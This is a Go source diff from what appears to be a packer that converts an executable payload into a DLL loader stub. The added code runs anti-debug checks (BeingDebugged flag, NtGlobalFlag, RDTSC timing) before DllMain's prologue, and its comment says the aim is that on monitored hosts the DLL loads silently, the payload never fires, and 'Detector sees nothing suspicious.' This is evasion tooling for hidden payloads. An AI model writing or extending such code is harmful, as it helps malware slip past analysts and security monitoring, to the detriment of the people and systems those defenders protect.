@@ -85,6 +85,21 @@ func EmitConvertedDLLStub(b *amd64.Builder, plan transform.Plan, rounds []poly.R
 		return ErrNoRounds
 	}
 
+	// Anti-debug runs BEFORE the prologue so a positive detection exits
+	// via the bare RET emitted by emitAntiDebugWindowsPE — the stack is
+	// still exactly as the loader left it (no frame setup yet), and RAX
+	// carries a non-zero check result (BeingDebugged byte, NtGlobalFlag
+	// mask, or RDTSC delta — all positive on detection). Loader reads
+	// RAX as BOOL TRUE → DllMain "succeeded" → DLL loads silently
+	// without ever decrypting or spawning. Detector sees nothing
+	// suspicious; payload simply doesn't fire on monitored hosts.
+	// Slice 5.6 of docs/refactor-2026-doc/packer-exe-to-dll-plan.md.
+	if opts.AntiDebug {
+		if err := emitAntiDebug(b, plan.Format); err != nil {
+			return fmt.Errorf("stage1/converted: antidebug: %w", err)
+		}
+	}
+
 	// --- prologue: stack frame + spill rcx/edx/r8/r15 (shared helper) ---
 	if err := emitDllMainPrologue(b, convertedDLLFrameSize, "stage1/converted"); err != nil {
 		return err
